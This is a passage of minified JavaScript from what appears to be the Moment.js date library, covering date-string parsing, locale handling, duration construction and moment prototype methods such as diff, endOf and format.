i=n._locale.weekdaysParse(e,s,n._strict);null!=i?t.d=i:y(n).invalidWeekday=e})),ge(["d","e","E"],(function(e,t,n,s){t[s]=Z(e)}));var Ze="Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),ze="Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"),$e="Su_Mo_Tu_We_Th_Fr_Sa".split("_"),qe=de,Be=de,Je=de;function Qe(){function e(e,t){return t.length-e.length}for(var t,n,s,i,r=[],a=[],o=[],u=[],l=0;l<7;l++)t=_([2e3,1]).day(l),n=me(this.weekdaysMin(t,"")),s=me(this.weekdaysShort(t,"")),i=me(this.weekdays(t,"")),r.push(n),a.push(s),o.push(i),u.push(n),u.push(s),u.push(i);r.sort(e),a.sort(e),o.sort(e),u.sort(e),this._weekdaysRegex=new RegExp("^("+u.join("|")+")","i"),this._weekdaysShortRegex=this._weekdaysRegex,this._weekdaysMinRegex=this._weekdaysRegex,this._weekdaysStrictRegex=new RegExp("^("+o.join("|")+")","i"),this._weekdaysShortStrictRegex=new RegExp("^("+a.join("|")+")","i"),this._weekdaysMinStrictRegex=new RegExp("^("+r.join("|")+")","i")}function Xe(){return this.hours()%12||12}function Ke(e,t){C(e,0,0,(function(){return this.localeData().meridiem(this.hours(),this.minutes(),t)}))}function et(e,t){return t._meridiemParse}C("H",["HH",2],0,"hour"),C("h",["hh",2],0,Xe),C("k",["kk",2],0,(function(){return this.hours()||24})),C("hmm",0,0,(function(){return""+Xe.apply(this)+T(this.minutes(),2)})),C("hmmss",0,0,(function(){return""+Xe.apply(this)+T(this.minutes(),2)+T(this.seconds(),2)})),C("Hmm",0,0,(function(){return""+this.hours()+T(this.minutes(),2)})),C("Hmmss",0,0,(function(){return""+this.hours()+T(this.minutes(),2)+T(this.seconds(),2)})),Ke("a",!0),Ke("A",!1),L("hour","h"),A("hour",13),ce("a",et),ce("A",et),ce("H",te),ce("h",te),ce("k",te),ce("HH",te,Q),ce("hh",te,Q),ce("kk",te,Q),ce("hmm",ne),ce("hmmss",se),ce("Hmm",ne),ce("Hmmss",se),ye(["H","HH"],Me),ye(["k","kk"],(function(e,t,n){var s=Z(e);t[Me]=24===s?0:s})),ye(["a","A"],(function(e,t,n){n._isPm=n._locale.isPM(e),n._meridiem=e})),ye(["h","hh"],(function(e,t,n){t[Me]=Z(e),y(n).bigHour=!0})),ye("hmm",(function(e,t,n){var s=e.length-2;t[Me]=Z(e.substr(0,s)),t[De]=Z(e.substr(s)),y(n).bigHour=!0})),ye("hmmss",(function(e,t,n){var s=e.length-4,i=e.length-2;t[Me]=Z(e.substr(0,s)),t[De]=Z(e.substr(s,2)),t[Se]=Z(e.substr(i)),y(n).bigHour=!0})),ye("Hmm",(function(e,t,n){var s=e.length-2;t[Me]=Z(e.substr(0,s)),t[De]=Z(e.substr(s))})),ye("Hmmss",(function(e,t,n){var s=e.length-4,i=e.length-2;t[Me]=Z(e.substr(0,s)),t[De]=Z(e.substr(s,2)),t[Se]=Z(e.substr(i))}));var nt,tt=z("Hours",!0),st={calendar:{sameDay:"[Today at] LT",nextDay:"[Tomorrow at] LT",nextWeek:"dddd [at] LT",lastDay:"[Yesterday at] LT",lastWeek:"[Last] dddd [at] LT",sameElse:"L"},longDateFormat:{LTS:"h:mm:ss A",LT:"h:mm A",L:"MM/DD/YYYY",LL:"MMMM D, YYYY",LLL:"MMMM D, YYYY h:mm A",LLLL:"dddd, MMMM D, YYYY h:mm A"},invalidDate:"Invalid date",ordinal:"%d",dayOfMonthOrdinalParse:/\d{1,2}/,relativeTime:{future:"in %s",past:"%s ago",s:"a few seconds",ss:"%d seconds",m:"a minute",mm:"%d minutes",h:"an hour",hh:"%d hours",d:"a day",dd:"%d days",w:"a week",ww:"%d weeks",M:"a month",MM:"%d months",y:"a year",yy:"%d years"},months:Te,monthsShort:Ne,week:{dow:0,doy:6},weekdays:Ze,weekdaysMin:$e,weekdaysShort:ze,meridiemParse:/[ap]\.?m?\.?/i},it={},rt={};function at(e){return e?e.toLowerCase().replace("_","-"):e}function ut(t){var e;if(void 0===it[t]&&"undefined"!=typeof module&&module&&module.exports)try{e=nt._abbr,require("./locale/"+t),lt(e)}catch(e){it[t]=null}return it[t]}function lt(e,t){var n;return e&&((n=r(t)?dt(e):ht(e,t))?nt=n:"undefined"!=typeof console&&console.warn&&console.warn("Locale "+e+" not found. Did you forget to load it?")),nt._abbr}function ht(e,t){if(null===t)return delete it[e],null;var n,s=st;if(t.abbr=e,null!=it[e])Y("defineLocaleOverride","use moment.updateLocale(localeName, config) to change an existing locale. moment.defineLocale(localeName, config) should only be used for creating a new locale See http://momentjs.com/guides/#/warnings/define-locale/ for more info."),s=it[e]._config;else if(null!=t.parentLocale)if(null!=it[t.parentLocale])s=it[t.parentLocale]._config;else{if(null==(n=ut(t.parentLocale)))return rt[t.parentLocale]||(rt[t.parentLocale]=[]),rt[t.parentLocale].push({name:e,config:t}),null;s=n._config}return it[e]=new x(b(s,t)),rt[e]&&rt[e].forEach((function(e){ht(e.name,e.config)})),lt(e),it[e]}function dt(e){var t;if(e&&e._locale&&e._locale._abbr&&(e=e._locale._abbr),!e)return nt;if(!o(e)){if(t=ut(e))return t;e=[e]}return function ot(e){for(var t,n,s,i,r=0;r<e.length;){for(t=(i=at(e[r]).split("-")).length,n=(n=at(e[r+1]))?n.split("-"):null;0<t;){if(s=ut(i.slice(0,t).join("-")))return s;if(n&&n.length>=t&&function(e,t){for(var n=Math.min(e.length,t.length),s=0;s<n;s+=1)if(e[s]!==t[s])return s;return n}(i,n)>=t-1)break;t--}r++}return nt}(e)}function ct(e){var t,n=e._a;return n&&-2===y(e).overflow&&(t=n[ve]<0||11<n[ve]?ve:n[ke]<1||n[ke]>xe(n[pe],n[ve])?ke:n[Me]<0||24<n[Me]||24===n[Me]&&(0!==n[De]||0!==n[Se]||0!==n[Ye])?Me:n[De]<0||59<n[De]?De:n[Se]<0||59<n[Se]?Se:n[Ye]<0||999<n[Ye]?Ye:-1,y(e)._overflowDayOfYear&&(t<pe||ke<t)&&(t=ke),y(e)._overflowWeeks&&-1===t&&(t=Oe),y(e)._overflowWeekday&&-1===t&&(t=be),y(e).overflow=t),e}var ft=/^\s*((?:[+-]\d{6}|\d{4})-(?:\d\d-\d\d|W\d\d-\d|W\d\d|\d\d\d|\d\d))(?:(T| )(\d\d(?::\d\d(?::\d\d(?:[.,]\d+)?)?)?)([+-]\d\d(?::?\d\d)?|\s*Z)?)?$/,mt=/^\s*((?:[+-]\d{6}|\d{4})(?:\d\d\d\d|W\d\d\d|W\d\d|\d\d\d|\d\d|))(?:(T| )(\d\d(?:\d\d(?:\d\d(?:[.,]\d+)?)?)?)([+-]\d\d(?::?\d\d)?|\s*Z)?)?$/,_t=/Z|[+-]\d\d(?::?\d\d)?/,yt=[["YYYYYY-MM-DD",/[+-]\d{6}-\d\d-\d\d/],["YYYY-MM-DD",/\d{4}-\d\d-\d\d/],["GGGG-[W]WW-E",/\d{4}-W\d\d-\d/],["GGGG-[W]WW",/\d{4}-W\d\d/,!1],["YYYY-DDD",/\d{4}-\d{3}/],["YYYY-MM",/\d{4}-\d\d/,!1],["YYYYYYMMDD",/[+-]\d{10}/],["YYYYMMDD",/\d{8}/],["GGGG[W]WWE",/\d{4}W\d{3}/],["GGGG[W]WW",/\d{4}W\d{2}/,!1],["YYYYDDD",/\d{7}/],["YYYYMM",/\d{6}/,!1],["YYYY",/\d{4}/,!1]],gt=[["HH:mm:ss.SSSS",/\d\d:\d\d:\d\d\.\d+/],["HH:mm:ss,SSSS",/\d\d:\d\d:\d\d,\d+/],["HH:mm:ss",/\d\d:\d\d:\d\d/],["HH:mm",/\d\d:\d\d/],["HHmmss.SSSS",/\d\d\d\d\d\d\.\d+/],["HHmmss,SSSS",/\d\d\d\d\d\d,\d+/],["HHmmss",/\d\d\d\d\d\d/],["HHmm",/\d\d\d\d/],["HH",/\d\d/]],wt=/^\/?Date\((-?\d+)/i,pt=/^(?:(Mon|Tue|Wed|Thu|Fri|Sat|Sun),?\s)?(\d{1,2})\s(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s(\d{2,4})\s(\d\d):(\d\d)(?::(\d\d))?\s(?:(UT|GMT|[ECMP][SD]T)|([Zz])|([+-]\d{4}))$/,vt={UT:0,GMT:0,EDT:-240,EST:-300,CDT:-300,CST:-360,MDT:-360,MST:-420,PDT:-420,PST:-480};function kt(e){var t,n,s,i,r,a,o=e._i,u=ft.exec(o)||mt.exec(o);if(u){for(y(e).iso=!0,t=0,n=yt.length;t<n;t++)if(yt[t][1].exec(u[1])){i=yt[t][0],s=!1!==yt[t][2];break}if(null==i)return void(e._isValid=!1);if(u[3]){for(t=0,n=gt.length;t<n;t++)if(gt[t][1].exec(u[3])){r=(u[2]||" ")+gt[t][0];break}if(null==r)return void(e._isValid=!1)}if(!s&&null!=r)return void(e._isValid=!1);if(u[4]){if(!_t.exec(u[4]))return void(e._isValid=!1);a="Z"}e._f=i+(r||"")+(a||""),Ot(e)}else e._isValid=!1}function Dt(e){var t,n,s,i,r=pt.exec(e._i.replace(/\([^)]*\)|[\n\t]/g," ").replace(/(\s\s+)/g," ").replace(/^\s\s*/,"").replace(/\s\s*$/,""));if(r){if(t=function Mt(e,t,n,s,i,r){var a=[function(e){var t=parseInt(e,10);return t<=49?2e3+t:t<=999?1900+t:t}(e),Ne.indexOf(t),parseInt(n,10),parseInt(s,10),parseInt(i,10)];return r&&a.push(parseInt(r,10)),a}(r[4],r[3],r[2],r[5],r[6],r[7]),s=t,i=e,(n=r[1])&&ze.indexOf(n)!==new Date(s[0],s[1],s[2]).getDay()&&(y(i).weekdayMismatch=!0,!void(i._isValid=!1)))return;e._a=t,e._tzm=function(e,t,n){if(e)return vt[e];if(t)return 0;var s=parseInt(n,10),i=s%100;return(s-i)/100*60+i}(r[8],r[9],r[10]),e._d=Ve.apply(null,e._a),e._d.setUTCMinutes(e._d.getUTCMinutes()-e._tzm),y(e).rfc2822=!0}else e._isValid=!1}function St(e,t,n){return null!=e?e:null!=t?t:n}function Yt(e){var t,n,s,i,r,a,o,u=[];if(!e._d){for(a=e,o=new Date(f.now()),s=a._useUTC?[o.getUTCFullYear(),o.getUTCMonth(),o.getUTCDate()]:[o.getFullYear(),o.getMonth(),o.getDate()],e._w&&null==e._a[ke]&&null==e._a[ve]&&function(e){var t,n,s,i,r,a,o,u,l;null!=(t=e._w).GG||null!=t.W||null!=t.E?(r=1,a=4,n=St(t.GG,e._a[pe],Ae(Tt(),1,4).year),s=St(t.W,1),((i=St(t.E,1))<1||7<i)&&(u=!0)):(r=e._locale._week.dow,a=e._locale._week.doy,l=Ae(Tt(),r,a),n=St(t.gg,e._a[pe],l.year),s=St(t.w,l.week),null!=t.d?((i=t.d)<0||6<i)&&(u=!0):null!=t.e?(i=t.e+r,(t.e<0||6<t.e)&&(u=!0)):i=r),s<1||s>je(n,r,a)?y(e)._overflowWeeks=!0:null!=u?y(e)._overflowWeekday=!0:(o=Ee(n,s,i,r,a),e._a[pe]=o.year,e._dayOfYear=o.dayOfYear)}(e),null!=e._dayOfYear&&(r=St(e._a[pe],s[pe]),(e._dayOfYear>Fe(r)||0===e._dayOfYear)&&(y(e)._overflowDayOfYear=!0),n=Ve(r,0,e._dayOfYear),e._a[ve]=n.getUTCMonth(),e._a[ke]=n.getUTCDate()),t=0;t<3&&null==e._a[t];++t)e._a[t]=u[t]=s[t];for(;t<7;t++)e._a[t]=u[t]=null==e._a[t]?2===t?1:0:e._a[t];24===e._a[Me]&&0===e._a[De]&&0===e._a[Se]&&0===e._a[Ye]&&(e._nextDay=!0,e._a[Me]=0),e._d=(e._useUTC?Ve:function(e,t,n,s,i,r,a){var o;return e<100&&0<=e?(o=new Date(e+400,t,n,s,i,r,a),isFinite(o.getFullYear())&&o.setFullYear(e)):o=new Date(e,t,n,s,i,r,a),o}).apply(null,u),i=e._useUTC?e._d.getUTCDay():e._d.getDay(),null!=e._tzm&&e._d.setUTCMinutes(e._d.getUTCMinutes()-e._tzm),e._nextDay&&(e._a[Me]=24),e._w&&void 0!==e._w.d&&e._w.d!==i&&(y(e).weekdayMismatch=!0)}}function Ot(e){if(e._f!==f.ISO_8601)if(e._f!==f.RFC_2822){e._a=[],y(e).empty=!0;for(var t,n,s,i,r,a,o,u=""+e._i,l=u.length,h=0,d=H(e._f,e._locale).match(N)||[],c=0;c<d.length;c++)n=d[c],(t=(u.match(fe(n,e))||[])[0])&&(0<(s=u.substr(0,u.indexOf(t))).length&&y(e).unusedInput.push(s),u=u.slice(u.indexOf(t)+t.length),h+=t.length),W[n]?(t?y(e).empty=!1:y(e).unusedTokens.push(n),r=n,o=e,null!=(a=t)&&m(_e,r)&&_e[r](a,o._a,o,r)):e._strict&&!t&&y(e).unusedTokens.push(n);y(e).charsLeftOver=l-h,0<u.length&&y(e).unusedInput.push(u),e._a[Me]<=12&&!0===y(e).bigHour&&0<e._a[Me]&&(y(e).bigHour=void 0),y(e).parsedDateParts=e._a.slice(0),y(e).meridiem=e._meridiem,e._a[Me]=function(e,t,n){var s;return null==n?t:null!=e.meridiemHour?e.meridiemHour(t,n):(null!=e.isPM&&((s=e.isPM(n))&&t<12&&(t+=12),s||12!==t||(t=0)),t)}(e._locale,e._a[Me],e._meridiem),null!==(i=y(e).era)&&(e._a[pe]=e._locale.erasConvertYear(i,e._a[pe])),Yt(e),ct(e)}else Dt(e);else kt(e)}function bt(e){var t,n,s=e._i,i=e._f;return e._locale=e._locale||dt(e._l),null===s||void 0===i&&""===s?w({nullInput:!0}):("string"==typeof s&&(e._i=s=e._locale.preparse(s)),M(s)?new k(ct(s)):(a(s)?e._d=s:o(i)?function(e){var t,n,s,i,r,a,o=!1;if(0===e._f.length)return y(e).invalidFormat=!0,e._d=new Date(NaN);for(i=0;i<e._f.length;i++)r=0,a=!1,t=v({},e),null!=e._useUTC&&(t._useUTC=e._useUTC),t._f=e._f[i],Ot(t),g(t)&&(a=!0),r+=y(t).charsLeftOver,r+=10*y(t).unusedTokens.length,y(t).score=r,o?r<s&&(s=r,n=t):(null==s||r<s||a)&&(s=r,n=t,a&&(o=!0));c(e,n||t)}(e):i?Ot(e):r(n=(t=e)._i)?t._d=new Date(f.now()):a(n)?t._d=new Date(n.valueOf()):"string"==typeof n?function(e){var t=wt.exec(e._i);null===t?(kt(e),!1===e._isValid&&(delete e._isValid,Dt(e),!1===e._isValid&&(delete e._isValid,e._strict?e._isValid=!1:f.createFromInputFallback(e)))):e._d=new Date(+t[1])}(t):o(n)?(t._a=d(n.slice(0),(function(e){return parseInt(e,10)})),Yt(t)):u(n)?function(e){var t,n;e._d||(n=void 0===(t=G(e._i)).day?t.date:t.day,e._a=d([t.year,t.month,n,t.hour,t.minute,t.second,t.millisecond],(function(e){return e&&parseInt(e,10)})),Yt(e))}(t):h(n)?t._d=new Date(n):f.createFromInputFallback(t),g(e)||(e._d=null),e))}function xt(e,t,n,s,i){var r,a={};return!0!==t&&!1!==t||(s=t,t=void 0),!0!==n&&!1!==n||(s=n,n=void 0),(u(e)&&l(e)||o(e)&&0===e.length)&&(e=void 0),a._isAMomentObject=!0,a._useUTC=a._isUTC=i,a._l=n,a._i=e,a._f=t,a._strict=s,(r=new k(ct(bt(a))))._nextDay&&(r.add(1,"d"),r._nextDay=void 0),r}function Tt(e,t,n,s){return xt(e,t,n,s,!1)}f.createFromInputFallback=n("value provided is not in a recognized RFC2822 or ISO format. moment construction falls back to js Date(), which is not reliable across all browsers and versions. Non RFC2822/ISO date formats are discouraged. Please refer to http://momentjs.com/guides/#/warnings/js-date/ for more info.",(function(e){e._d=new Date(e._i+(e._useUTC?" UTC":""))})),f.ISO_8601=function(){},f.RFC_2822=function(){};var Nt=n("moment().min is deprecated, use moment.max instead. http://momentjs.com/guides/#/warnings/min-max/",(function(){var e=Tt.apply(null,arguments);return this.isValid()&&e.isValid()?e<this?this:e:w()})),Pt=n("moment().max is deprecated, use moment.min instead. http://momentjs.com/guides/#/warnings/min-max/",(function(){var e=Tt.apply(null,arguments);return this.isValid()&&e.isValid()?this<e?this:e:w()}));function Rt(e,t){var n,s;if(1===t.length&&o(t[0])&&(t=t[0]),!t.length)return Tt();for(n=t[0],s=1;s<t.length;++s)t[s].isValid()&&!t[s][e](n)||(n=t[s]);return n}var Wt=["year","quarter","month","week","day","hour","minute","second","millisecond"];function Ct(e){var t=G(e),n=t.year||0,s=t.quarter||0,i=t.month||0,r=t.week||t.isoWeek||0,a=t.day||0,o=t.hour||0,u=t.minute||0,l=t.second||0,h=t.millisecond||0;this._isValid=function(e){var t,n,s=!1;for(t in e)if(m(e,t)&&(-1===we.call(Wt,t)||null!=e[t]&&isNaN(e[t])))return!1;for(n=0;n<Wt.length;++n)if(e[Wt[n]]){if(s)return!1;parseFloat(e[Wt[n]])!==Z(e[Wt[n]])&&(s=!0)}return!0}(t),this._milliseconds=+h+1e3*l+6e4*u+1e3*o*60*60,this._days=+a+7*r,this._months=+i+3*s+12*n,this._data={},this._locale=dt(),this._bubble()}function Ut(e){return e instanceof Ct}function Ht(e){return e<0?-1*Math.round(-1*e):Math.round(e)}function Ft(e,n){C(e,0,0,(function(){var e=this.utcOffset(),t="+";return e<0&&(e=-e,t="-"),t+T(~~(e/60),2)+n+T(~~e%60,2)}))}Ft("Z",":"),Ft("ZZ",""),ce("Z",he),ce("ZZ",he),ye(["Z","ZZ"],(function(e,t,n){n._useUTC=!0,n._tzm=Vt(he,e)}));var Lt=/([\+\-]|\d\d)/gi;function Vt(e,t){var n,s,i=(t||"").match(e);return null===i?null:0===(s=60*(n=((i[i.length-1]||[])+"").match(Lt)||["-",0,0])[1]+Z(n[2]))?0:"+"===n[0]?s:-s}function Gt(e,t){var n,s;return t._isUTC?(n=t.clone(),s=(M(e)||a(e)?e.valueOf():Tt(e).valueOf())-n.valueOf(),n._d.setTime(n._d.valueOf()+s),f.updateOffset(n,!1),n):Tt(e).local()}function Et(e){return-Math.round(e._d.getTimezoneOffset())}function At(){return!!this.isValid()&&this._isUTC&&0===this._offset}f.updateOffset=function(){};var jt=/^(-|\+)?(?:(\d*)[. ])?(\d+):(\d+)(?::(\d+)(\.\d*)?)?$/,It=/^(-|\+)?P(?:([-+]?[0-9,.]*)Y)?(?:([-+]?[0-9,.]*)M)?(?:([-+]?[0-9,.]*)W)?(?:([-+]?[0-9,.]*)D)?(?:T(?:([-+]?[0-9,.]*)H)?(?:([-+]?[0-9,.]*)M)?(?:([-+]?[0-9,.]*)S)?)?$/;function Zt(e,t){var n,s,i,r=e,a=null;return Ut(e)?r={ms:e._milliseconds,d:e._days,M:e._months}:h(e)||!isNaN(+e)?(r={},t?r[t]=+e:r.milliseconds=+e):(a=jt.exec(e))?(n="-"===a[1]?-1:1,r={y:0,d:Z(a[ke])*n,h:Z(a[Me])*n,m:Z(a[De])*n,s:Z(a[Se])*n,ms:Z(Ht(1e3*a[Ye]))*n}):(a=It.exec(e))?(n="-"===a[1]?-1:1,r={y:zt(a[2],n),M:zt(a[3],n),w:zt(a[4],n),d:zt(a[5],n),h:zt(a[6],n),m:zt(a[7],n),s:zt(a[8],n)}):null==r?r={}:"object"==typeof r&&("from"in r||"to"in r)&&(i=function(e,t){var n;return e.isValid()&&t.isValid()?(t=Gt(t,e),e.isBefore(t)?n=$t(e,t):((n=$t(t,e)).milliseconds=-n.milliseconds,n.months=-n.months),n):{milliseconds:0,months:0}}(Tt(r.from),Tt(r.to)),(r={}).ms=i.milliseconds,r.M=i.months),s=new Ct(r),Ut(e)&&m(e,"_locale")&&(s._locale=e._locale),Ut(e)&&m(e,"_isValid")&&(s._isValid=e._isValid),s}function zt(e,t){var n=e&&parseFloat(e.replace(",","."));return(isNaN(n)?0:n)*t}function $t(e,t){var n={};return n.months=t.month()-e.month()+12*(t.year()-e.year()),e.clone().add(n.months,"M").isAfter(t)&&--n.months,n.milliseconds=t-e.clone().add(n.months,"M"),n}function qt(s,i){return function(e,t){var n;return null===t||isNaN(+t)||(Y(i,"moment()."+i+"(period, number) is deprecated. Please use moment()."+i+"(number, period). See http://momentjs.com/guides/#/warnings/add-inverted-param/ for more info."),n=e,e=t,t=n),Bt(this,Zt(e,t),s),this}}function Bt(e,t,n,s){var i=t._milliseconds,r=Ht(t._days),a=Ht(t._months);e.isValid()&&(s=null==s||s,a&&Ce(e,$(e,"Month")+a*n),r&&q(e,"Date",$(e,"Date")+r*n),i&&e._d.setTime(e._d.valueOf()+i*n),s&&f.updateOffset(e,r||a))}Zt.fn=Ct.prototype,Zt.invalid=function(){return Zt(NaN)};var Jt=qt(1,"add"),Qt=qt(-1,"subtract");function Xt(e){return"string"==typeof e||e instanceof String}function en(e,t){if(e.date()<t.date())return-en(t,e);var n=12*(t.year()-e.year())+(t.month()-e.month()),s=e.clone().add(n,"months");return-(n+(t-s<0?(t-s)/(s-e.clone().add(n-1,"months")):(t-s)/(e.clone().add(1+n,"months")-s)))||0}function tn(e){var t;return void 0===e?this._locale._abbr:(null!=(t=dt(e))&&(this._locale=t),this)}f.defaultFormat="YYYY-MM-DDTHH:mm:ssZ",f.defaultFormatUtc="YYYY-MM-DDTHH:mm:ss[Z]";var nn=n("moment().lang() is deprecated. Instead, use moment().localeData() to get the language configuration. Use moment().locale() to change languages.",(function(e){return void 0===e?this.localeData():this.locale(e)}));function sn(){return this._locale}var rn=126227808e5;function an(e,t){return(e%t+t)%t}function on(e,t,n){return e<100&&0<=e?new Date(e+400,t,n)-rn:new Date(e,t,n).valueOf()}function un(e,t,n){return e<100&&0<=e?Date.UTC(e+400,t,n)-rn:Date.UTC(e,t,n)}function ln(e,t){return t.erasAbbrRegex(e)}function hn(){for(var e=[],t=[],n=[],s=[],i=this.eras(),r=0,a=i.length;r<a;++r)t.push(me(i[r].name)),e.push(me(i[r].abbr)),n.push(me(i[r].narrow)),s.push(me(i[r].name)),s.push(me(i[r].abbr)),s.push(me(i[r].narrow));this._erasRegex=new RegExp("^("+s.join("|")+")","i"),this._erasNameRegex=new RegExp("^("+t.join("|")+")","i"),this._erasAbbrRegex=new RegExp("^("+e.join("|")+")","i"),this._erasNarrowRegex=new RegExp("^("+n.join("|")+")","i")}function dn(e,t){C(0,[e,e.length],0,t)}function cn(e,t,n,s,i){var r;return null==e?Ae(this,s,i).year:((r=je(e,s,i))<t&&(t=r),function(e,t,n,s,i){var r=Ee(e,t,n,s,i),a=Ve(r.year,0,r.dayOfYear);return this.year(a.getUTCFullYear()),this.month(a.getUTCMonth()),this.date(a.getUTCDate()),this}.call(this,e,t,n,s,i))}C("N",0,0,"eraAbbr"),C("NN",0,0,"eraAbbr"),C("NNN",0,0,"eraAbbr"),C("NNNN",0,0,"eraName"),C("NNNNN",0,0,"eraNarrow"),C("y",["y",1],"yo","eraYear"),C("y",["yy",2],0,"eraYear"),C("y",["yyy",3],0,"eraYear"),C("y",["yyyy",4],0,"eraYear"),ce("N",ln),ce("NN",ln),ce("NNN",ln),ce("NNNN",(function(e,t){return t.erasNameRegex(e)})),ce("NNNNN",(function(e,t){return t.erasNarrowRegex(e)})),ye(["N","NN","NNN","NNNN","NNNNN"],(function(e,t,n,s){var i=n._locale.erasParse(e,s,n._strict);i?y(n).era=i:y(n).invalidEra=e})),ce("y",oe),ce("yy",oe),ce("yyy",oe),ce("yyyy",oe),ce("yo",(function(e,t){return t._eraYearOrdinalRegex||oe})),ye(["y","yy","yyy","yyyy"],pe),ye(["yo"],(function(e,t,n,s){var i;n._locale._eraYearOrdinalRegex&&(i=e.match(n._locale._eraYearOrdinalRegex)),n._locale.eraYearOrdinalParse?t[pe]=n._locale.eraYearOrdinalParse(e,i):t[pe]=parseInt(e,10)})),C(0,["gg",2],0,(function(){return this.weekYear()%100})),C(0,["GG",2],0,(function(){return this.isoWeekYear()%100})),dn("gggg","weekYear"),dn("ggggg","weekYear"),dn("GGGG","isoWeekYear"),dn("GGGGG","isoWeekYear"),L("weekYear","gg"),L("isoWeekYear","GG"),A("weekYear",1),A("isoWeekYear",1),ce("G",ue),ce("g",ue),ce("GG",te,Q),ce("gg",te,Q),ce("GGGG",re,K),ce("gggg",re,K),ce("GGGGG",ae,ee),ce("ggggg",ae,ee),ge(["gggg","ggggg","GGGG","GGGGG"],(function(e,t,n,s){t[s.substr(0,2)]=Z(e)})),ge(["gg","GG"],(function(e,t,n,s){t[s]=f.parseTwoDigitYear(e)})),C("Q",0,"Qo","quarter"),L("quarter","Q"),A("quarter",7),ce("Q",J),ye("Q",(function(e,t){t[ve]=3*(Z(e)-1)})),C("D",["DD",2],"Do","date"),L("date","D"),A("date",9),ce("D",te),ce("DD",te,Q),ce("Do",(function(e,t){return e?t._dayOfMonthOrdinalParse||t._ordinalParse:t._dayOfMonthOrdinalParseLenient})),ye(["D","DD"],ke),ye("Do",(function(e,t){t[ke]=Z(e.match(te)[0])}));var fn=z("Date",!0);C("DDD",["DDDD",3],"DDDo","dayOfYear"),L("dayOfYear","DDD"),A("dayOfYear",4),ce("DDD",ie),ce("DDDD",X),ye(["DDD","DDDD"],(function(e,t,n){n._dayOfYear=Z(e)})),C("m",["mm",2],0,"minute"),L("minute","m"),A("minute",14),ce("m",te),ce("mm",te,Q),ye(["m","mm"],De);var mn=z("Minutes",!1);C("s",["ss",2],0,"second"),L("second","s"),A("second",15),ce("s",te),ce("ss",te,Q),ye(["s","ss"],Se);var _n,yn,gn=z("Seconds",!1);for(C("S",0,0,(function(){return~~(this.millisecond()/100)})),C(0,["SS",2],0,(function(){return~~(this.millisecond()/10)})),C(0,["SSS",3],0,"millisecond"),C(0,["SSSS",4],0,(function(){return 10*this.millisecond()})),C(0,["SSSSS",5],0,(function(){return 100*this.millisecond()})),C(0,["SSSSSS",6],0,(function(){return 1e3*this.millisecond()})),C(0,["SSSSSSS",7],0,(function(){return 1e4*this.millisecond()})),C(0,["SSSSSSSS",8],0,(function(){return 1e5*this.millisecond()})),C(0,["SSSSSSSSS",9],0,(function(){return 1e6*this.millisecond()})),L("millisecond","ms"),A("millisecond",16),ce("S",ie,J),ce("SS",ie,Q),ce("SSS",ie,X),_n="SSSS";_n.length<=9;_n+="S")ce(_n,oe);function wn(e,t){t[Ye]=Z(1e3*("0."+e))}for(_n="S";_n.length<=9;_n+="S")ye(_n,wn);yn=z("Milliseconds",!1),C("z",0,0,"zoneAbbr"),C("zz",0,0,"zoneName");var pn=k.prototype;function vn(e){return e}pn.add=Jt,pn.calendar=function(e,t){1===arguments.length&&(arguments[0]?function Kt(e){return M(e)||a(e)||Xt(e)||h(e)||function(t){var e=o(t),n=!1;return e&&(n=0===t.filter((function(e){return!h(e)&&Xt(t)})).length),e&&n}(e)||function(e){var t,s=u(e)&&!l(e),i=!1,r=["years","year","y","months","month","M","days","day","d","dates","date","D","hours","hour","h","minutes","minute","m","seconds","second","s","milliseconds","millisecond","ms"];for(t=0;t<r.length;t+=1)i=i||m(e,r[t]);return s&&i}(e)||null==e}(arguments[0])?(e=arguments[0],t=void 0):function(e){for(var t=u(e)&&!l(e),n=!1,s=["sameDay","nextDay","lastDay","nextWeek","lastWeek","sameElse"],i=0;i<s.length;i+=1)n=n||m(e,s[i]);return t&&n}(arguments[0])&&(t=arguments[0],e=void 0):t=e=void 0);var n=e||Tt(),s=Gt(n,this).startOf("day"),i=f.calendarFormat(this,s)||"sameElse",r=t&&(O(t[i])?t[i].call(this,n):t[i]);return this.format(r||this.localeData().calendar(i,this,Tt(n)))},pn.clone=function(){return new k(this)},pn.diff=function(e,t,n){var s,i,r;if(!this.isValid())return NaN;if(!(s=Gt(e,this)).isValid())return NaN;switch(i=6e4*(s.utcOffset()-this.utcOffset()),t=V(t)){case"year":r=en(this,s)/12;break;case"month":r=en(this,s);break;case"quarter":r=en(this,s)/3;break;case"second":r=(this-s)/1e3;break;case"minute":r=(this-s)/6e4;break;case"hour":r=(this-s)/36e5;break;case"day":r=(this-s-i)/864e5;break;case"week":r=(this-s-i)/6048e5;break;default:r=this-s}return n?r:I(r)},pn.endOf=function(e){var t,n;if(void 0===(e=V(e))||"millisecond"===e||!this.isValid())return this;switch(n=this._isUTC?un:on,e){case"year":t=n(this.year()+1,0,1)-1;break;case"quarter":t=n(this.year(),this.month()-this.month()%3+3,1)-1;break;case"month":t=n(this.year(),this.month()+1,1)-1;break;case"week":t=n(this.year(),this.month(),this.date()-this.weekday()+7)-1;break;case"isoWeek":t=n(this.year(),this.month(),this.date()-(this.isoWeekday()-1)+7)-1;break;case"day":case"date":t=n(this.year(),this.month(),this.date()+1)-1;break;case"hour":t=this._d.valueOf(),t+=36e5-an(t+(this._isUTC?0:6e4*this.utcOffset()),36e5)-1;break;case"minute":t=this._d.valueOf(),t+=6e4-an(t,6e4)-1;break;case"second":t=this._d.valueOf(),t+=1e3-an(t,1e3)-1}return this._d.setTime(t),f.updateOffset(this,!0),this},pn.format=function(e){var t=U(this,e=e||(this.isUtc()?f.defaultFormatUtc:f.defaultFormat));return this.localeData().postformat(t)},pn.from=function(e,t){return this.isValid()&&(M(e)&&e.isValid()||Tt(e).isValid())?Zt({to:this,from:e}).locale(this.locale()).humanize(!t):this.localeData().invalidDate()},pn.fromNow=function(e){return this.from(Tt(),e)},pn.to=function(e,t){return this.isValid()&&(M(e)&&e.isValid()||Tt(e).isValid())?Zt({from:this,to:e}).locale(this.locale()).humanize(!t):this.localeData().invalidDate()},pn.toNow=function(e){return this.to(Tt(),e)},pn.get=function(e){return O(this[e=V(e)])?this[e]():this},pn.invalidAt=function(){return y(this).overflow},pn.isAfter=function(e,t){var 